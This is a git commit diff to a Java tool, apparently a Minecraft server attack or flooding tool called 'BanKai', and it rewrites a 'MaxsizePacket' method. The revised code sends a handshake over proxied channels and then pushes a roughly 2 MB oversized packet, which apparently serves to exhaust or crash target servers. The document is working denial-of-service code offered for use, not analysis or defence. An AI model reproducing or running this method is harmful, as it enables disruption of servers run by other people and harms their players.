4452ee2ec52937d46d39c24db53c3d539df59cbb
XDMEOW <yatharthrathi.rathi2@gmail.com>
2022-08-04 20:04:51 +0530

    its good i think

--- src/main/java/dev/xdmeow/core/methods/impl/MaxsizePacket.java
+++ src/main/java/dev/xdmeow/core/methods/impl/MaxsizePacket.java
@@ -2,9 +2,11 @@ package dev.xdmeow.core.methods.impl;
 
 import java.io.IOException;
 
+import dev.xdmeow.BanKai;
 import dev.xdmeow.core.NettyBootstrap;
 import dev.xdmeow.core.methods.IMethod;
 import dev.xdmeow.core.util.helper.RandomUtils;
+import dev.xdmeow.core.util.mcutil.ext.Handshake;
 import dev.xdmeow.core.util.proxy.Proxy;
 import io.netty.buffer.ByteBuf;
 import io.netty.buffer.ByteBufOutputStream;
@@ -12,13 +14,15 @@ import io.netty.buffer.Unpooled;
 import io.netty.channel.Channel;
 
 public class MaxsizePacket implements IMethod{
-    int size = 2097151;
-    String xd = "";
-    
+    private Handshake handshake;
+    private int size = 2097150;
+    private byte[] bytes;
+    private byte[] arrxd;
+
     public MaxsizePacket() {
-        for (int i = 1; i < this.size; i++) {
-            this.xd += RandomUtils.randomString(1);
-        }
+        this.handshake = new Handshake(BanKai.protocol, BanKai.srvRecord, BanKai.port, 2);
+        this.bytes = this.handshake.getWrappedPacket();
+        this.arrxd = new byte[2097150];
     }
 
     public static void writeVarInt(ByteBufOutputStream out, int paramInt) throws IOException {
@@ -32,12 +36,15 @@ public class MaxsizePacket implements IMethod{
      
     @Override
     public void accept(Channel channel, Proxy proxy) {
+
+        channel.write(Unpooled.buffer().writeBytes(this.bytes));
+
         ByteBuf b = Unpooled.buffer();
         ByteBufOutputStream out = new ByteBufOutputStream(b);
+
         try {
-            writeVarInt(out, size);
-            out.write(0);
-            out.writeUTF(this.xd);
+            writeVarInt(out, (size+1));
+            out.write(this.arrxd);
             out.close();
         } catch (IOException e) {
             e.printStackTrace();
